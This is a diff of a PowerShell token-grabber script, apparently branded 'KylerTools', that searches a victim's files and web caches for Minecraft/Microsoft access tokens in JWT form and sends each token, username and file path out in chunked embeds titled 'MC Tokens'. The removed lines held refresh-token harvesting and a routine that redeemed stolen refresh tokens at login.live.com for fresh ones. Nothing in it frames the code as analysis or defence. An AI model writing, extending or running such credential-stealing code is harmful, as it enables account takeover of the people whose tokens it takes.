@@ -13,41 +13,32 @@ $found = @()
 $seen = @{}
 
 $jwtRegex = "eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}"
-$msaRegex = "M\.[A-Za-z0-9_\-\.~]{100,}"
 
 function Add-Token {
     param($tok, $user, $src, $type)
     if(-not $tok){ return }
     if($tok.Length -lt 80){ return }
-    if(-not ($tok.StartsWith("eyJ") -or $tok.StartsWith("M."))){ return }
+    if(-not $tok.StartsWith("eyJ")){ return }
     $key = "$type|$tok"
     if($seen.ContainsKey($key)){ return }
     $seen[$key] = $true
-    $short = $type -replace "Token",""
-    $script:found += @"
-[$short] $user
-  token: $tok
-  file:  $src
-"@
+    $script:found += [PSCustomObject]@{
+        User  = $user
+        Type  = $type
+        Token = $tok
+        File  = $src
+    }
 }
 
 function Scan-Text {
     param($text, $src, $user)
     if(-not $text){ return }
-
     $ms = [regex]::Matches($text, $jwtRegex)
     foreach($m in $ms){
         $val = [string]$m.Value
         if([string]::IsNullOrEmpty($val)){ continue }
-        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }
+        if($val -like "eyJhbGciOiJSU0EtT0FFUC*"){ continue }  # skip encrypted JWE wrappers
         Add-Token $val $user $src "accessToken"
-    }
-
-    $mr = [regex]::Matches($text, $msaRegex)
-    foreach($m in $mr){
-        $val = [string]$m.Value
-        if([string]::IsNullOrEmpty($val)){ continue }
-        Add-Token $val $user $src "refreshToken"
     }
 }
 
@@ -76,9 +67,6 @@ function Scan-File {
                 if($node.minecraftProfile -and $node.minecraftProfile.name){ $uname = $node.minecraftProfile.name }
                 foreach($k in @("accessToken","token","access_token")){
                     if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "accessToken" }
-                }
-                foreach($k in @("refreshToken","refresh_token")){
-                    if($node.PSObject.Properties[$k] -and $node.$k){ Add-Token $node.$k $uname $path "refreshToken" }
                 }
                 foreach($prop in $node.PSObject.Properties){
                     if($prop.Value -is [PSCustomObject] -or ($prop.Value -is [System.Collections.IEnumerable] -and $prop.Value -isnot [string])){
@@ -252,42 +240,7 @@ foreach($lc in $webcaches){
     }catch{}
 }
 
-# ---------- 6. refresh ----------
-function Refresh-Token {
-    param($refreshTok)
-    try{
-        $body = @{
-            client_id = "00000000402b5328"
-            refresh_token = $refreshTok
-            grant_type = "refresh_token"
-            scope = "service::user.auth.xboxlive.com::MBI_SSL"
-        }
-        $resp = iwr -Uri "https://login.live.com/oauth20_token.srf" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded" -TimeoutSec 10 -EA Stop
-        $j = $resp.Content | ConvertFrom-Json
-        if($j.access_token){ return @{ access = $j.access_token; refresh = $j.refresh_token } }
-    }catch{}
-    return $null
-}
-
-$refreshed = @()
-foreach($line in $found){
-    if($line -match "\[refresh\] unknown`n  token: ([^\n]+)"){
-        $rt = $matches[1].Trim()
-        $new = Refresh-Token $rt
-        if($new){
-            $refreshed += @"
-[refreshed] fresh tokens
-  new access:  $($new.access)
-  new refresh: $($new.refresh)
-"@
-        }
-    }
-}
-
-if($refreshed.Count -gt 0){
-    $found += "`n--- refreshed ---`n" + ($refreshed -join "`n")
-}
-
+# ---------- send embed ----------
 function Send-Embed {
     param($title, $desc, $color, $footerText)
     $embed = @{
@@ -316,7 +269,13 @@ function Send-Embed {
 if($found.Count -eq 0){
     $joined = "nothin found bro"
 } else {
-    $joined = $found -join "`n"
+    $lines = @()
+    $i = 0
+    foreach($t in $found){
+        $i++
+        $lines += "```ansi`n[ $i ] $($t.User)`nType: $($t.Type)`nToken: $($t.Token)`nFile: $($t.File)`n```"
+    }
+    $joined = $lines -join "`n"
 }
 
 $limit = 1700
@@ -328,6 +287,6 @@ for($i = 0; $i -lt $joined.Length; $i += $limit){
 $n = 0
 foreach($c in $chunks){
     $n++
-    Send-Embed -title "mc tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
+    Send-Embed -title "KylerTools | MC Tokens" -desc $c -color 5793266 -footerText "kylertools | part $n/$($chunks.Count)"
     Start-Sleep -Seconds 2
 }
